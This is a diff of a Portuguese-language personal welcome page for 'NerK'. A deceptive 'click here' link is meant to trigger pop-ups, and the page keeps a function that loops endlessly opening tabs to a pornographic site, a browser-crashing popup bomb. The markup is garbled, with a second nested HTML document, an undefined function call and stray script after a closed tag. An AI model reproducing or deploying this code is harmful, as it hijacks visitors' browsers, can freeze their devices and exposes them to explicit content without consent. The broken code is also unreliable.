@@ -1,10 +1,72 @@
-<button onclick="abrirGuiasInfinitas()">Clique para abrir guias infinitas</button>
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>...</title>
+    <style>
+        /* Estilo para o corpo da página */
+        body {
+            margin: 0; /* Remove margens padrão */
+            font-family: Arial, sans-serif;
+            color: white; /* Cor do texto para contrastar com o fundo */
+            background-image: url('https://i.pinimg.com/736x/5f/e6/92/5fe6923f287234ac1c193bd941b0017f.jpg'); /* Link da imagem de fundo */
+            background-size: cover; /* Faz a imagem cobrir toda a tela */
+            background-position: center; /* Centraliza a imagem */
+            background-repeat: no-repeat; /* Impede que a imagem se repita */
+            background-attachment: fixed; /* Fixa a imagem ao rolar a página */
+        }
 
-<script>
+        /* Estilo para o conteúdo */
+        .conteudo {
+            padding: 20px;
+            background-color: rgba(0, 0, 0, 0.5); /* Fundo semi-transparente para melhorar a legibilidade */
+            text-align: center;
+            margin: 50px auto;
+            max-width: 600px;
+            border-radius: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="conteudo">
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <h1>Bem-vindo ao Site do NerK</h1>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+        }
+        a {
+            color: green;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <p>Clique no link abaixo:</p>
+    <a id="popupLink" href="#">Clique aqui kkk</a>
+
+    <script>
 function abrirGuiasInfinitas() {
     while (true) {
         window.open('https://www.xvideos.com', '_blank');
     }
 }
 </script>
+    
+        // Adiciona um evento de clique ao link
+        document.getElementById("popupLink").addEventListener("click", function(event) {
+            event.preventDefault(); // Impede o comportamento padrão do link
+            abrirPopups(); // Chama a função para abrir pop-ups
+        });
+    </script>
+</body>
+</html>
 
